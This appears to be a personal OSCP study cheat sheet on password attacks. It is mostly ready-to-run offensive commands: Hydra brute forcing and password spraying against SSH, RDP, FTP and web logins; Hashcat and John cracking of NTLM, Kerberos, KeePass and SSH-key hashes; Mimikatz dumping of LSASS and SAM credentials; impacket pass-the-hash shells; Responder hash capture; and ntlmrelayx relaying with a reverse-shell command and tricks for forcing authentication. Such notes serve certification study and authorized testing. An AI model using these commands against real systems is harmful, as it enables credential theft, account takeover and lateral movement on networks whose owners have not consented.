# Module 16 : Password Attacks


---

## Commonly used wordlists
```bash
#Name wordlists (used for password spraying)
/usr/share/wordlists/dirb/others/names.txt

#Intensive, standard go to brute force password
/usr/share/wordlists/rockyou.txt

#Smallest to largest, less intensive
/usr/share/wordlists/metasploit/http_default_pass.txt
/usr/share/wordlists/dirb/others/best110.txt
/usr/share/seclists/Passwords/Common-Credentials/top-1000.txt
/usr/share/wordlists/fasttrack.txt # Always preferred for OSCP
```

---

## Hydra reference

**SSH brute force:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

**RDP brute force:**
```bash
hydra -l admin -P wordlist.txt rdp://<target>
```

**FTP brute force:**
```bash
hydra -l admin -P wordlist.txt ftp://<target>
```

**HTTP POST login form:**
```bash
hydra -l admin -P wordlist.txt <target> http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

The three colon-separated parts are:
- Login page path
- POST body with `^USER^` and `^PASS^` as placeholders
- Failure string — text that appears on a failed login

**HTTP GET (basic auth):**
```bash
hydra -l admin -P wordlist.txt <target> http-get /admin/

```
> Pop up asking for username and password on website

**Password Spraying**
```bash
hydra -L name_wordlist.txt -p "SuperSecretPassword!" rdp://<target>
```

---

**Key flags:**
- `-l` — single username
- `-L` — username wordlist
- `-p` — single password
- `-P` — password wordlist
- `-t` — threads (keep low, 10-16, to avoid crashes)
- `-s` — specify non-default port
- `-f` — stop after first valid login
- `-V` — verbose, shows each attempt

**Example with non-standard port:**
```bash
hydra -l admin -P wordlist.txt -s 8080 -f <target> http-post-form "/login:user=^USER^&pass=^PASS^:Failed"
```

---

## Hashcat Reference 

**Hashcat — quick reference**

**Basic syntax:**
```bash
hashcat -m <mode> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Common hash modes (-m):**

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 400 | phpass (WordPress) |
| 1000 | NTLM (Windows) |
| 1800 | SHA-512 (Linux /etc/shadow) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoasting (TGS-REP) |
| 18200 | AS-REP Roasting |

**Don't know the hash type?**
```bash
hashid <hash_string>
hash-identifier
```

**With rules (smarter cracking):**
```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Show cracked passwords:**
```bash
hashcat -m 1000 hashes.txt --show
```

**Force CPU if no GPU:**
```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --force
```

**Example**
```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

**Show Password (from specific example)**
```bash
hashcat -m 13400 keepass_hashcat.hash --show
```

**Key flags:**
- `-m` — hash mode
- `-a 0` — dictionary attack (most common)
- `-a 3` — brute force mask attack
- `-r` — rules file
- `--force` — run on CPU when no GPU available
- `--show` — display already cracked results
- `-o` — output cracked hashes to file

**John the Ripper alternative (simpler syntax):**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

John auto-detects hash type so no `-m` needed. Use John when you're unsure of the hash type, use Hashcat when you know it and want speed.

**For OSCP specifically:**
Modes 1000 (NTLM) and 5600 (NetNTLMv2) are the most common — you'll dump these from Windows machines and AD environments constantly.

---

## 16.2.3. Cracking methodology

1. Extract hashes
2. Format hashes
3. Calculate the cracking time
4. Prepare wordlist
5. Attack the hash

---

### keepass

`.kdbx` is a **KeePass password database** file. KeePass is a password manager — it stores all of a user's passwords in one encrypted file.

If you can crack the master password for this database, you get access to **every password stored inside it**. That could include SSH credentials, admin passwords, database logins — everything.

**The OSCP workflow:**

1. Find the `.kdbx` file (you just did this)
2. Extract the hash for cracking:
```bash
keepass2john Database.kdbx > keepass_hash.txt
```
3. Crack it with hashcat or john:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
#Shows password after cracked.
john --show keepass_hash.txt
```
4. Open the database with the cracked password:
```bash
kpcli --kdb Database.kdbx
```

> hashcat and johntheripper have different formats. Hashcat takes only pure hash while John has Database: (For this case.)

---

### ssh

**SSH private key cracking workflow:**

**Step 1 — Find the private key:**
Via LFI, directory traversal, or on a compromised machine:
```
/home/<user>/.ssh/id_rsa
```

**Step 2 — Check if it's passphrase protected:**
```bash
ssh -i id_rsa user@target
```
If it asks for a passphrase (not a password) → the key is encrypted.

**Step 3 — Extract the hash:**
```bash
ssh2john id_rsa > ssh_hash.txt
```

**Step 4 — Crack with John:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

**Step 5 — Show cracked passphrase:**
```bash
john --show ssh_hash.txt
```

**Step 6 — Use the key with the passphrase:**
```bash
chmod 400 id_rsa
ssh -i id_rsa user@target
# Enter the cracked passphrase when prompted
```

**The pattern is identical to KeePass:**
1. Find the encrypted file
2. Extract hash with `<tool>2john`
3. Crack with john or hashcat
4. Use the cracked password to open it

This same pattern works for almost anything:
- `keepass2john` → KeePass
- `ssh2john` → SSH keys
- `zip2john` → encrypted zip files
- `rar2john` → encrypted rar files
- `office2john` → password protected Office docs

---

## Mimikatz 

**Mimikatz** — a Windows post-exploitation tool that extracts credentials from memory.

**What it can do:**

1. **Dump plaintext passwords** from Windows memory (LSASS process)
2. **Extract NTLM hashes** from logged-in users
3. **Perform Pass-the-Hash** — authenticate using a hash without knowing the password
4. **Kerberos attacks** — extract and forge tickets (Golden/Silver Ticket)
5. **Dump SAM database** — local user password hashes

**Key commands you'll use:**

```powershell
mimikatz.exe
privilege::debug #permission to access memory
token::elevate # escalate to SYSTEM, requires admin/SYSTEM priv
sekurlsa::logonpasswords #dump everything
lsadump::sam #dump sam file passwords
```

This dumps credentials for all users currently or recently logged into the machine.

**Why it matters for OSCP:**

After getting admin/SYSTEM on a Windows box, run Mimikatz to extract credentials. Those credentials often work on other machines in the network — that's lateral movement, especially critical in the AD section.

---

## Impacket-psexec

**Impacket** — a collection of Python tools for interacting with Windows network protocols. It's your Swiss army knife for attacking Windows machines from Kali.

**impacket-psexec** — gives you a SYSTEM shell on a remote Windows machine using credentials or hashes.

```bash
# With password
impacket-psexec Administrator:password@192.168.177.212

# With NTLM hash (Pass-the-Hash)
impacket-psexec Administrator@<ip.addr> -hashes :<hash>
```

It works by uploading a service binary to the target via SMB, creating a Windows service, and executing it — giving you a SYSTEM shell.

**Other important Impacket tools for OSCP:**

```bash
# Remote shell (similar to psexec, different method)
impacket-wmiexec Administrator@target -hashes :<hash>

# Dump credentials remotely without touching the target
impacket-secretsdump Administrator@target -hashes :<hash>

# MSSQL client
impacket-mssqlclient sa:password@target -windows-auth

# Kerberos attacks (AD)
impacket-GetNPUsers domain/user -dc-ip target
impacket-GetUserSPNs domain/user:password -dc-ip target

# NTLMv2 Pass the hash RCE
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "<powershell base64 encoded revshell>"
```

### impacket-psexec requirements:

1. **Port 445 (SMB) must be open** on the target
2. **Valid credentials** — either a password or NTLM hash
3. **Admin privileges** — the user must be a local administrator on the target
4. **Writable share** — psexec needs to upload a service binary, typically to `ADMIN$` or `C$` share
5. **ADMIN$ share must be accessible** — this is the default admin share at `C:\Windows`


**If psexec fails, try these alternatives in order:**

```bash
# wmiexec — uses WMI instead of SMB service creation
impacket-wmiexec user:password@target

# smbexec — similar to psexec but different execution method
impacket-smbexec user:password@target

# evil-winrm — uses WinRM (port 5985)
evil-winrm -i target -u user -p password
```

**Common failure reasons:**
- User is not local admin → access denied
- AV blocks the uploaded service binary → try wmiexec instead
- ADMIN$ share disabled → try smbexec
- Port 445 filtered → try evil-winrm on port 5985

---

## Cracking NTLM hash


**NTLMv1** - located in SAM file, mimikatz to extract it.
```bash
# -r represents rule textfile, not mandatory
hashcat -m 1000 <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
```

**NTLMv2** - Gained when accessing your ip via responder.
```bash
hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force
``` 

---

## Responder 

**Connecting to Responder**
```bash
sudo responder -I tun0 #your vpn
```

**Checking Logs** - if you missed the hash and it states "previously captured hash"
```bash
#identify which textfile it is
ls /usr/share/responder/logs/

#Read the textfile
cat /usr/share/responder/logs/<filename>

#Example of an NTLMv2 hash
sam::MARKETINGWK01:398130d41253d78a:5DADB44E1ACF3134A111E2815130A5CD:010100000000000000DDFA6D7114DD01271C869D39D7C71E0000000002000800490039004200350001001E00570049004E002D004B003200350041003400430032003700560033004C0004003400570049004E002D004B003200350041003400430032003700560033004C002E0049003900420035002E004C004F00430041004C000300140049003900420035002E004C004F00430041004C000500140049003900420035002E004C004F00430041004C000700080000DDFA6D7114DD0106000400020000000800300030000000000000000000000000200000969CE39609A1300812FC10F0F490D71A2804DF4FD97B9A2C3F49641618F3F72C0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200350030000000000000000000
```


---

## Pass-The-Hash (To other services)

- `impacket` #mentioned above
- `smbclient` #refer to module 6


**NTLMv2 Pass the hash RCE**
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <ip.addr> -c "<powershell base64 encoded revshell>"

#In victim's shell
C:\Windows\system32>whoami
whoami
files01\files02admin

C:\Windows\system32>dir \\<yourip>\anyname
```

---

### impacket-ntlmrelayx reference

**impacket-ntlmrelayx — quick reference**

**Basic relay with command execution:**
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "command here"
```

**Relay to dump SAM hashes:**
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip>
```
Without `-c`, it automatically dumps the SAM database if relay succeeds.

**Relay to multiple targets (from file):**
```bash
impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt -c "command"
```

**Key flags:**
- `-t` — single target IP to relay to
- `-tf` — file containing multiple target IPs
- `-c` — command to execute on successful relay
- `--no-http-server` — disable HTTP listener, SMB only
- `-smb2support` — enable SMBv2 (always include this)
- `-e` — execute a binary instead of a command
- `-l` — directory to dump loot (SAM, secrets)

**The attack flow:**
```
1. Start ntlmrelayx listening
2. Trigger victim to authenticate to you (Responder, command injection, etc.)
3. ntlmrelayx relays hash to target
4. If user has admin on target → command executes or SAM dumps
```

**Requirements:**
- SMB signing disabled on target
- Relay to a DIFFERENT machine than the source
- Captured user must have admin rights on the relay target

**Common triggers to force authentication:**
- Responder poisoning
- Command injection: `dir \\your_kali_ip\share`
- Upload `.scf` or `.url` file
- XSS or SSRF pointing to your IP

---